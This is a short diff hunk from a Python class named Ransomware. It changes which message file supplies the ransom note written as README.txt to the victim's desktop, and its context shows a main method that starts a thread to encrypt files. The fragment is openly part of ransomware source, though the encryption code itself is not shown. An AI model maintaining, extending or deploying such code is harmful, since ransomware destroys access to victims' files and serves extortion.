@@ -59,7 +59,7 @@ class Ransomware:
 
     def notes(self) -> None:
         with open(os.path.join(self.desktop, 'README.txt'), 'w') as f:
-            f.write(open('msg_file.txt').read())
+            f.write(open('msg.txt').read())
 
     def main(self) -> None:
         threading.Thread(target=self.encrypt_files).start()
